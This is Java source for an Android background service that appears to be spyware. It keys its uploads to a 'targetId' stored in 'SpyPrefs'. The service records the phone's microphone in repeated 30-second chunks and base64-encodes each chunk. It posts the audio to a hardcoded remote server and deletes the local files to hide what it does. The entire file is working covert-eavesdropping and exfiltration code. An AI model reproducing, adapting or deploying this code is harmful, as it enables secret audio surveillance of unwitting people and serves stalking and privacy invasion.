package com.nullx.pp;

import android.app.Service;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.IBinder;
import android.os.Environment;
import android.util.Base64;
import android.util.Log;
import org.json.JSONObject;
import java.io.File;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class MicrophoneRecordingService extends Service {
    private static final String TAG = "CRPT.MicRecorder";
    private static final String SERVER_URL = "http://papa.queen-official.com:2949/api/post-response/";
    private MediaRecorder mediaRecorder;
    private boolean isRecording = false;
    private String audioFilePath;
    private Thread recordingThread;
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (!isRecording) {
            startRecording();
        }
        return START_STICKY;
    }
    
    private void startRecording() {
        recordingThread = new Thread(() -> {
            while (isRecording) {
                try {
                    audioFilePath = getExternalCacheDir().getAbsolutePath() + "/mic_" + System.currentTimeMillis() + ".mp3";
                    mediaRecorder = new MediaRecorder();
                    mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                    mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                    mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
                    mediaRecorder.setOutputFile(audioFilePath);
                    mediaRecorder.prepare();
                    mediaRecorder.start();
                    
                    // Record for 30 seconds
                    Thread.sleep(30000);
                    
                    mediaRecorder.stop();
                    mediaRecorder.release();
                    
                    // Send recorded audio
                    sendAudioToServer(audioFilePath);
                    
                    // Delete file after sending
                    new File(audioFilePath).delete();
                    
                } catch (Exception e) {
                    Log.e(TAG, "Recording error: " + e.getMessage());
                }
            }
        });
        isRecording = true;
        recordingThread.start();
    }
    
    private void sendAudioToServer(String filePath) {
        try {
            File audioFile = new File(filePath);
            if (!audioFile.exists()) return;
            
            FileInputStream fis = new FileInputStream(audioFile);
            byte[] audioBytes = new byte[(int) audioFile.length()];
            fis.read(audioBytes);
            fis.close();
            
            String base64Audio = Base64.encodeToString(audioBytes, Base64.NO_WRAP);
            String targetId = getSharedPreferences("SpyPrefs", MODE_PRIVATE).getString("targetId", "unknown");
            
            URL url = new URL(SERVER_URL + targetId);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            
            JSONObject payload = new JSONObject();
            payload.put("cmd", "audio_chunk");
            payload.put("data", base64Audio);
            
            try (OutputStream os = conn.getOutputStream()) {
                os.write(payload.toString().getBytes());
            }
            conn.getResponseCode();
            conn.disconnect();
            
        } catch (Exception e) {
            Log.e(TAG, "Error sending audio: " + e.getMessage());
        }
    }
    
    @Override
    public void onDestroy() {
        isRecording = false;
        if (mediaRecorder != null) {
            try {
                mediaRecorder.stop();
                mediaRecorder.release();
            } catch (Exception e) {}
        }
        super.onDestroy();
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}